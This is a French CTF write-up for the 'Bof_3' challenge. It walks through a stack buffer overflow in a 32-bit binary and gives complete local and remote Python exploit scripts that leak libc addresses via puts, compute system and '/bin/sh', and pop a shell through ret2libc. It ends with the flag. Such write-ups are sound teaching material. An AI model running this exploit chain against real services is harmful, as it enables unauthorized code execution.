# Bof_3

## Analyse

Ce challenge nous offre encore un binaire `service`.
A nouveau une courte analyse avec `checksec` et `file`.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_3 $ checksec ./service
[*] '/home/aether/Documents/ctf/cyberthreatforce/pwn/Bof_3/service'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_3 $ file ./service
./service: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8ff402354a00e00bd0258b7c24575a5f9620c347, for GNU/Linux 4.4.0, not stripped
```

Parfait ce binaire est en `x86`, `No PIE` les adresses des instructions ne vont donc pas bouger.

Grâce à Ghidra, je peux reverse le binaire et constatter que la fonction `main` est très courte.

```js
undefined4 main(void)
{
  ignorMe(&stack0x00000004);
  puts("password: ");
  vuln();
  puts("nop");
  return 0;
}
```

La fonction vulnérable doit bien porter son nom `vuln`.

```js
void vuln(void)
{
  undefined local_70 [104];
  
  __x86.get_pc_thunk.ax();
  read(0,local_70,0x96);
  return;
}
```

## Exploitation

La fonction `read` permet de lire `0x96` caractères soient `150` en décimal et place ensuite la string dans `local_70` qui a un buffer de `104` en décimal.
Un overflow est donc possible.
Il faut aussi compte `8` bytes de plus pour pouvoir overflow car au début de la fonction `vuln`, `ebp` et `ebx` sont sauvegardé.
Il va donc falloir overflow avec `112` caractères.

```c
08049196 <vuln>:
 8049196:    55                       push   ebp
 8049197:    89 e5                    mov    ebp,esp
 8049199:    53                       push   ebx
```

Le but ici, va être d'overflow, puis d'exécuter `puts` avec comme argument la fonction `read` pour récupérer son adresse dans la libc et de jump à nouveau sur `main` pour exécuter de nouveau `puts` avec cette fois-ci `__libc_start_main` en argument.

Grâce a ces deux leaks, je vais pouvoir récupérer la libc distante.
Cela va aussi me permettre de casser l'ASLR et de récupérer l'adresse de `system` ainsi que de la string `/bin/sh`.
Ensuite, je pourrai faire un ret2libc.

A nouveau, je test d'abord en local.

```python
#!/usr/bin/env python3

from exploit import u32
from pwn import *

# LIBC
LIBC = ELF("./libc/libc_local.so")

if __name__ == "__main__":
    # Connect to the challenge
    p = process("./service")
    # Recv the header
    print(p.read())

    # main function addr
    main_addr = p32(0x08049209)
    # Address of puts
    puts_addr = p32(0x8049060)
    # PLT address
    read_plt = p32(0x0804c010)
    libc_start_main = p32(0x0804c018)

    # Create payload
    payload_leak = b"".join([
        b"A" * 112,# Buffer overflow
        puts_addr,# Puts fonction
        main_addr,# Return to main
        read_plt# Get addr of read@LIBC
    ])

    # Leak read@libc
    p.send(payload_leak + b"\n")
    read_leak = p.read()[:4]
    hex_read_leak = read_leak[::-1].hex()
    print(f"[+] Found read@libc : 0x{hex_read_leak}")

    # Create payload
    payload_leak = b"".join([
        b"A" * 112,# Buffer overflow
        puts_addr,# Puts fonction
        main_addr,# Return to main
        libc_start_main# Get addr of __libc_start_main@LIBC
    ])

    # Leak __libc_start_main@libc
    p.send(payload_leak + b"\n")
    libc_start_main_leak = p.read()[:4]
    hex_libc_start_main_leak = libc_start_main_leak[::-1].hex()
    print(f"[+] Found __libc_start_main@libc : 0x{hex_libc_start_main_leak}")

    # Compute libc start
    libc_start = u32(libc_start_main_leak) - LIBC.symbols["__libc_start_main"]
    print(f"[+] libc base address: {hex(libc_start)}")

    # Get system addr
    system_addr = libc_start + LIBC.symbols["system"]
    print(f"[+] system address : {hex(system_addr)}")

    # Get binsh addr
    binsh_addr = libc_start + next(LIBC.search(b"/bin/sh"))
    print(f"[+] /bin/sh address : {hex(binsh_addr)}")

    # Convert to real addr
    system_addr = p32(system_addr)
    binsh_addr = p32(binsh_addr)

    payload_ret2libc = b"".join([
        b"A" * 112,# Buffer overflow
        system_addr,
        b"ARTH",
        binsh_addr
    ])

    # Send payload in password
    p.send(payload_ret2libc + b"\n")

    p.interactive()
```

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_3 $ python3.8 local_exploit.py
[*] '/home/aether/Documents/ctf/cyberthreatforce/pwn/Bof_3/libc/libc_local.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './service': pid 16035
b'password: \n'
[+] Found read@libc : 0xf7e0fd60
[+] Found __libc_start_main@libc : 0xf7d41e30
[+] libc base address: 0xf7d29000
[+] system address : 0xf7d662e0
[+] /bin/sh address : 0xf7ea70af
[*] Switching to interactive mode
$ id
uid=1000(aether) gid=1000(aether) groupes=1000(aether)
```

L'exploit local fonctionnant, je peux changer `pwntools` par `socket` pour dialoguer avec le service et l'exploiter en remote.

Je l'exécute une première fois pour me permettre de récupérer la libc depuis <https://libc.blukat.me/>.
Une fois la libc récupéré, je peux exploiter le service distant.

```python
#!/usr/bin/env python3

from pwnlib.elf.elf import ELF

import socket
import struct

def p32(addr):
    return struct.pack("<I", addr)

def u32(addr):
    return struct.unpack("<I", addr)

# Connect to the challenge
HOST = "144.217.73.235"
PORT = 27699
# LIBC
LIBC = ELF("./libc/libc6-i386_2.28-10_amd64.so")

def connect(HOST, PORT):
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect((HOST, PORT))
    tcp.settimeout(1)
    return tcp

def recv(tcp):
    data = b""
    while True:
        try:
            data += tcp.recv(1024)
        except socket.timeout:
            break
    return data

if __name__ == "__main__":
    # Connect to the challenge
    tcp = connect(HOST, PORT)
    # Recv the header
    recv(tcp)

    # main function addr
    main_addr = p32(0x08049209)
    # Address of puts
    puts_addr = p32(0x8049060)
    # PLT address
    read_plt = p32(0x0804c010)
    libc_start_main = p32(0x0804c018)

    # Create payload
    payload_leak = b"".join([
        b"A" * 112,# Buffer overflow
        puts_addr,# Puts fonction
        main_addr,# Return to main
        read_plt# Get addr of read@LIBC
    ])

    # Leak read@libc
    tcp.send(payload_leak + b"\n")
    read_leak = recv(tcp)[:4]
    hex_read_leak = read_leak[::-1].hex()
    print(f"[+] Found read@libc : 0x{hex_read_leak}")

    # Create payload
    payload_leak = b"".join([
        b"A" * 112,# Buffer overflow
        puts_addr,# Puts fonction
        main_addr,# Return to main
        libc_start_main# Get addr of __libc_start_main@LIBC
    ])

    # Leak __libc_start_main@libc
    tcp.send(payload_leak + b"\n")
    libc_start_main_leak = recv(tcp)[:4]
    hex_libc_start_main_leak = libc_start_main_leak[::-1].hex()
    print(f"[+] Found __libc_start_main@libc : 0x{hex_libc_start_main_leak}")

    # Compute libc start
    libc_start = u32(libc_start_main_leak)[0] - LIBC.symbols["__libc_start_main"]
    print(f"[+] libc base address: {hex(libc_start)}")

    # Get system addr
    system_addr = libc_start + LIBC.symbols["system"]
    print(f"[+] system address : {hex(system_addr)}")

    # Get binsh addr
    binsh_addr = libc_start + next(LIBC.search(b"/bin/sh"))
    print(f"[+] /bin/sh address : {hex(binsh_addr)}")

    # Convert to real addr
    system_addr = p32(system_addr)
    binsh_addr = p32(binsh_addr)

    payload_ret2libc = b"".join([
        b"A" * 112,# Buffer overflow
        system_addr,
        b"ARTH",
        binsh_addr
    ])

    # Send payload in password
    tcp.send(payload_ret2libc + b"\n")

    while True:
        try:
            tcp.send(input(">>> ").encode() + b"\n")
            print(tcp.recv(1024).decode().strip())
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            exit(0)
```

## Exploitation via ret2dl_resolve

Merci à @0xSoEasY, son script est disponible ici: <https://github.com/AetherBlack/CyberThreatForce2021/blob/main/Pwn/Bof_3/solve_ret2dl_resolve.py>.

## Flag

A nouveau le flag est sous `/home/ctf/flag.txt`.

flag: `CYBERTF{Zero_leak_@nd_bruteF0rc3}`
